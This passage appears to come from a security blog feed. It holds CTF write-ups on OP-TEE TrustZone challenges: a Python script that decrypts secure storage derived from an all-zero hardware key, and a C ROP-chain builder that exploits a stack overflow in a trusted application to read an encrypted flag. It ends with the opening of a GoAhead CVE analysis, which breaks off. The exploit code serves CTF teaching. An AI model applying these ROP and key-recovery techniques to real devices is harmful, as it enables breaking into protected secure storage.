   TEE_FS_KM_SSK_SIZE, dummy, <span class="keyword">sizeof</span>(dummy));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_hmac 这里使用的是 HMAC_SHA256</p><p>最后就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSK &#x3D; HMACSHA256 (SSK, TA_UUID)</span><br></pre></td></tr></table></figure><p><strong>File Encryption Key （FEK）</strong> </p><p>当一个新的TEE文件被创建时，密钥管理器将通过 PRNG（pesudo随机数生成器）为TEE文件生成一个新的 FEK，并将加密的 FEK 存储在 meta 文件中。FEK 用于对存储在 meta 文件中的TEE文件信息或块文件中的数据进行加密/解密。</p><h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><p>通过逆向和比对OP-Tee的源代码，希望选手能发现 <code>HUK</code>没有被设置。然后flag被加密了且存储在 <code>/data/tee/2</code> 文件里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TEE_Result __fastcall <span class="title">tee_otp_get_hw_unique_key</span><span class="params">(tee_hw_unique_key *hwkey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(hwkey, <span class="number">0</span>, <span class="keyword">sizeof</span>(tee_hw_unique_key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么只要分析下安全存储的过程，可以参考如图：</p><p><a href="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" title="Block Data Encryption" class="gallery-item"><img src="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" alt="Block Data Encryption"></a></p><p>思路就大概是</p><ol><li>通过 <code>HUK </code> 和 <code>chip id</code> 计算出 <code>SSK</code></li><li>通过计算出来的<code>SSk</code> 和 <code>TA UUID</code>计算出 <code>TSK</code></li><li>通过计算出的 <code>TSK</code> 和 被加密的 <code>FEK</code> 计算出明文 <code>FEK</code> </li><li>最后通过 <code>FEK</code> 解出明文的数据</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" title="image-20220124142822275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" alt="image-20220124142822275"></a></p><p>其中被加密的 <code>FEK</code> 存储在 <code>/data/tee/2</code> 文件中，可以参考如下 010 tempte结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;--- 010 Editor v10.0.2 Binary Template</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;      File: </span><br><span class="line">&#x2F;&#x2F;   Authors: </span><br><span class="line">&#x2F;&#x2F;   Version: </span><br><span class="line">&#x2F;&#x2F;   Purpose: </span><br><span class="line">&#x2F;&#x2F;  Category: </span><br><span class="line">&#x2F;&#x2F; File Mask: </span><br><span class="line">&#x2F;&#x2F;  ID Bytes: </span><br><span class="line">&#x2F;&#x2F;   History: </span><br><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_FEK_SIZE 16</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_meta &#123;</span><br><span class="line">UINT64 length;</span><br><span class="line">&#125;tee_fs_htree_meta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_imeta &#123;</span><br><span class="line">struct tee_fs_htree_meta meta;</span><br><span class="line">UINT32 max_node_id;</span><br><span class="line">    UINT32 nop;</span><br><span class="line">&#125;tee_fs_htree_imeta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_image &#123;</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE];</span><br><span class="line">UCHAR imeta[sizeof(struct tee_fs_htree_imeta)];</span><br><span class="line">UINT32 counter;</span><br><span class="line">&#125;tee_fs_htree_image;</span><br><span class="line"></span><br><span class="line">#define TEE_FS_HTREE_HASH_SIZE32</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">typedef struct _tee_fs_htree_node_image &#123;</span><br><span class="line">&#x2F;* Note that calc_node_hash() depends on hash first in struct *&#x2F;</span><br><span class="line">UCHAR hash[TEE_FS_HTREE_HASH_SIZE];</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">USHORT flags;</span><br><span class="line">&#125;tee_fs_htree_node_image;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;--------------------------------------</span><br><span class="line">LittleEndian();</span><br><span class="line"></span><br><span class="line">tee_fs_htree_image  ver0_head;</span><br><span class="line">tee_fs_htree_image  ver1_head;</span><br><span class="line">FSeek(0x1000);</span><br><span class="line">tee_fs_htree_node_image ver0_root_node;</span><br><span class="line">tee_fs_htree_node_image ver1_root_node;</span><br><span class="line">FSeek(0x2000);</span><br></pre></td></tr></table></figure><h4 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h4><p>最后脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> HMAC, SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#计算ssk</span></span><br><span class="line">    huk = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    chip_id = <span class="string">b&#x27;BEEF&#x27;</span> * <span class="number">8</span></span><br><span class="line">    print(chip_id)</span><br><span class="line">    ssk_str = <span class="string">b&#x27;ONLY_FOR_tee_fs_ssk\x00&#x27;</span></span><br><span class="line">    m = HMAC.new(huk, digestmod=SHA256)</span><br><span class="line">    m.update(chip_id)</span><br><span class="line">    m.update(ssk_str)</span><br><span class="line">    ssk = m.digest()</span><br><span class="line">    print(ssk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#计算tsk</span></span><br><span class="line">    ta_uuid = <span class="string">b&#x27;\xbb\x50\xe7\xf4\x37\x14\xbf\x4f\x87\x85\x8d\x35\x80\xc3\x49\x94&#x27;</span> <span class="comment">#ta的uuid</span></span><br><span class="line">    m = HMAC.new(ssk, digestmod=SHA256)</span><br><span class="line">    m.update(ta_uuid)</span><br><span class="line">    tsk = m.digest()</span><br><span class="line">    print(tsk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解fek</span></span><br><span class="line">    enc_fek = <span class="string">b&#x27;\xe4\x9a\x95\xf2\xb5\xf4\x9c\x04\xf6\x07\x9f\xfb\xf0\x2e\xd2\xef&#x27;</span>  <span class="comment">#2在header里</span></span><br><span class="line">    cipher = AES.new(tsk, AES.MODE_ECB)</span><br><span class="line">    fek = cipher.decrypt(enc_fek)</span><br><span class="line">    print(fek)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解数据</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;....&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;\xb4\xc9\x6a\x22\xe6\x36\x72\xcf\x6a\x44\x8f\x10\xa3\x11\x44\x68&#x27;</span> <span class="comment">#对应node</span></span><br><span class="line">    cipher = AES.new(fek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    data = cipher.decrypt(enc_data)</span><br><span class="line">    print(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="UnTrustZone"><a href="#UnTrustZone" class="headerlink" title="UnTrustZone"></a>UnTrustZone</h3><p>题目描述</p><blockquote><p>UntrustZone</p><p>Score: <em>500</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pwn&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>It is clearly not worth your trust.</p><p>The default username is root.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.243.205.105 8899</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/UnstrustZone_d9d2151c29fa340f80f38197492001fe.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR-1"><a href="#TL-DR-1" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>这个题需要补充一些关于 <code>TrustZone</code> 的另外一部分关于 <code>TA</code>和<code>CA</code>的前置知识。 <code>TA</code> 是 Trusted Application 的缩写，通常运行在 TEE 环境下的应用简称为<code> TA</code>。<code>CA</code> 是 Client Application 的缩写，通常运行在 REE 环境下的应用简称为 CA。</p><p>一个访问安全OS的服务流程为：打开 TEE 环境 &gt; 开启一个会话 &gt; 发送命令 &gt; 获取信息 &gt; 结束会话 &gt; 关闭 TEE 环境。</p><p>借助OP-TEE来实现特定安全需求时，一次完整的功能调用一般都是起源于CA，TA做具体功能实现并返回数据到CA，而整个过程需要经过OP-TEE的client端接口，OP-TEE在Linux kernel端的驱动，Monitor模式下的SMC处理，OP-TEE OS的thread处理，OP-TEE中的TA程序运行，OP-TEE端底层库或者硬件资源支持等几个阶段。当TA执行完具体请求之后会按照原路径将得到的数据返回给CA。</p><h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><p>设计这个题目的时候，就只是想让选手了解下 <code>TA</code> 这个攻击面，所以漏洞设计的得特别简单，就是一个在<code>TA</code>中的栈溢出，我修改了附件中的<code>HUK</code>和签名时候的 key 让他保持于远程的不一致。希望选手通过 Pwn 这个 TA， 来获取 安全存储，即 <code>/data/tee/2</code> 下被加密的 flag 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data_sz = params[<span class="number">1</span>].memref.size;</span><br><span class="line"><span class="comment">// data = TEE_Malloc(data_sz, 0); patch for challenge</span></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x20</span>] ;</span><br><span class="line"><span class="keyword">if</span> (!data)</span><br><span class="line"><span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">TEE_MemMove(data, params[<span class="number">1</span>].memref.buffer, data_sz);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>参考： <a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#debugging-op-tee">optee-build/debug.md at master · ForgeRock/optee-build (github.com)</a></p><ul><li>有 源码调试：</li></ul><p>首先对 ldelf 的入口下断， <code>b thread_enter_user_mode</code></p><p>然后执行 CA 程序，在 LOG 窗口中找到 TA 的加载地址<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png"></a></p><p>然后对 TA 入口下断， <code>b *(baseaddr + TA_InvokeCommandEntryPoint_addr</code></p><ul><li><p>无源码调试</p><p>OP-TEE 有日志功能，在日志功能中能看到 TA 的加载地址，可以通过这个进行调试</p></li></ul><h5 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h5><table><thead><tr><th>Text Address</th><th>File Name</th><th>Description</th></tr></thead><tbody><tr><td>0x0</td><td>bl1.elf</td><td>ARM Trusted Firmware Boot Loader Stage 1</td></tr><tr><td>0x1070</td><td>libteec.so</td><td>OP-TEE Client Shared Library [Normal World]</td></tr><tr><td>0x4009c0</td><td><CA></td><td>Client Application [Normal World]</td></tr><tr><td>0xe01b000</td><td>bl2.elf</td><td>ARM Trusted Firmware Boot Loader Stage 2</td></tr><tr><td>0xe040000</td><td>bl31.elf</td><td>ARM Trusted Firmware Boot Loader Stage 3-1</td></tr><tr><td>0xe100000</td><td>tee.elf</td><td>OP-TEE</td></tr><tr><td>0xffff000008081000</td><td>vmlinux</td><td>Linux Kernel [Normal World]</td></tr></tbody></table><ul><li>usermod</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user mode内存布局</span><br><span class="line">E&#x2F;LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)</span><br><span class="line">E&#x2F;LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s</span><br><span class="line">E&#x2F;LD:  region  5: va 0x40014000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)</span><br><span class="line">E&#x2F;LD:  region  6: va 0x40015000 pa 0x5f60a888 size 0x001000 flags rw-- (param)</span><br><span class="line">E&#x2F;LD:  region  7: va 0x4004d000 pa 0x00001000 size 0x012000 flags r-xs [0]</span><br><span class="line"> &#x2F;&#x2F;随机 </span><br><span class="line">E&#x2F;LD:  region  8: va 0x4005f000 pa 0x00013000 size 0x00c000 flags rw-s [0]</span><br><span class="line"> &#x2F;&#x2F;随机</span><br></pre></td></tr></table></figure><p>一般而言： ldelf  加载地址是固定的， 处理代码位于 <code> build/optee*os/core/arch/arm/kernel/ldelf_loader.c</code></p><p><code>ldelf_load_ldelf</code> 函数中， 最后加载的base为  0x40006000, 具体代码可见<code>build/optee_os/core/arch/arm/kernel/ldelf_loader.c</code></p><h4 id="Solved-1"><a href="#Solved-1" class="headerlink" title="Solved"></a>Solved</h4><p>解题关键是需要了解没法直接解密的时候，我们应该如何读取 flag：</p><ol><li>TEE_AllocatePersistentObjectEnumerator</li><li>TEE_GetNextPersistentObject</li><li>TEE_OpenPersistentObject</li><li>TEE_ReadObjectData</li><li>memcpy data to buffer</li></ol><p>首先， <code>ldefl</code> 加载基地址是不变的，我们可以在这上边找 gadget ， 另外虽然 <code>TA</code>有随机化，但是这随机化并不是很高，可以通过爆破解决。所以 <code>TA</code> 的程序也是找 gadget 的目标之一。ldefl 程序的代码段是被通过 <code>ldelf_load_ldelf</code> 函数是写死在 <code>bl32_extra1.bin</code>中的。</p><p>最后我们找到的了几个可以设置 5 个参数的 gadget。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">CallFun5</span><span class="params">(TEEC_Session* sess,<span class="keyword">uint64_t</span> func,<span class="keyword">uint64_t</span> x0,<span class="keyword">uint64_t</span> x1,<span class="keyword">uint64_t</span> x2,<span class="keyword">uint64_t</span> x3,<span class="keyword">uint64_t</span> x4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//存放返回内存的地址在：g_ta_addr+124D8</span></span><br><span class="line"><span class="comment">//返回地址0x00000000400152b0</span></span><br><span class="line">payload = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(payload,tmp,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tmplen 0x%lx \n&quot;</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">48</span>) = <span class="number">0x40015150</span>;  <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">56</span>) = <span class="number">0x40004008</span>;  <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">40</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000003a28</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>) = x1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>; <span class="comment">//next x1  [x19+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x1 == [x19+0x10]</span></span><br><span class="line"><span class="comment">//0x0000000000003a28: ldr x1, [x19, #0x10]; add x0, x0, x1; str x0, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(payload+<span class="number">108</span>) = <span class="number">0x40015777</span>; <span class="comment">//next 19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>) = <span class="number">0x40014ff8</span>; <span class="comment">//next 20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">64</span>) = <span class="number">0x40004010</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">184</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000C40</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">344</span>) = x2; <span class="comment">//next x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x2 = [SP,#0x70+va]</span></span><br><span class="line"><span class="comment">//0x0000000000000C40 E2 37 40 F9                                   LDR             X2, [SP,#0x70+va]</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>+<span class="number">0x38</span>) = <span class="number">0x40015150</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">272</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">304</span>) = <span class="number">0</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">160</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>+<span class="number">8</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x0 = [x19 + 0x18]</span></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line"><span class="comment">//*(uint64_t*)(payload+360) = 0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">432</span>) = x1; <span class="comment">//next x27</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">440</span>) = x3; <span class="comment">//next x28</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">360</span>) = g_ta_addr+<span class="number">0x000000000000aa00</span>;<span class="comment">//next pc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x3 == x28  x1 == x27</span></span><br><span class="line"><span class="comment">//0x000000000000aa00 : mov x3, x28 ; csel x21, x21, x2, ne ; mov x1, x27 ; mov x2, x21 ; str x24, [sp, #0x78] ; blr x23</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">400</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000001f98</span>;<span class="comment">//next x23 next pc</span></span><br><span class="line"><span class="comment">//x21 == [sp, #0x20]</span></span><br><span class="line"><span class="comment">//0x0000000000001f98 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">376</span>) = <span class="number">0x40015170</span>; <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">496</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">472</span>) = g_ta_addr + <span class="number">0x0000000000005fa4</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">696</span>) = x4; <span class="comment">//next x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x1 == [x21, #8]</span></span><br><span class="line"><span class="comment">//0x0000000000005fa4 : ldr x4, [x20, #8] ; ldr x0, [x21, #8] ; cmp x4, x0 ; b.hi #0x5fc8 ; mov w0, w9 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">528</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">544</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">416</span>) = <span class="number">0xFFFFFFFFFFFFF001</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">520</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">728</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">568</span>) = func;<span class="comment">//0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.daimajiaoliu.com/daima/4872449c3100404">OP-TEE中secure stroage——安全存储使用的key的产生 (daimajiaoliu.com)</a></p><p><a href="https://optee.readthedocs.io/en/latest/">OP-TEE Documentation — OP-TEE documentation documentation (optee.readthedocs.io)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-42342 Goahead 环境变量注入漏洞分析</title>
    <link href="https://bestwing.me/CVE-2021-42342-Goahead.html"/>
    <id>https://bestwing.me/CVE-2021-42342-Goahead.html</id>
    <published>2022-01-09T16:00:00.000Z</published>
    <updated>2022-04-02T15:05:14.812Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>近日爆出GoAhead存在RCE漏洞（实际来源于 PBCTF 的一道题目），漏洞源于文件上传过滤器的处理缺陷，当与CGI处理程序一起使用时，可影响环境变量，从而导致RCE。漏洞影响版本为：</p><ul><li>GoAhead =4.x</li><li>5.x&lt;=GoAhead&lt;5.1.5</li></ul><p>我为啥看这个漏洞呢？是因为 phith0n 师傅发了一篇复现踩坑记， 我对其中一块 文件描述符找不到的解决过程比较感兴趣。于是和 @leommxj 一起看了下。然后简单记录了下这些过程，比较简略。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考 phith0n 的文章： <a href="https://tttang.com/archive/1399/">GoAhead环境变量注入复现踩坑记 - 跳跳糖 (tttang.com)</a></p><p>Dockerfile 如下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> beswing/swpwn:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">set</span> -ex \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get update 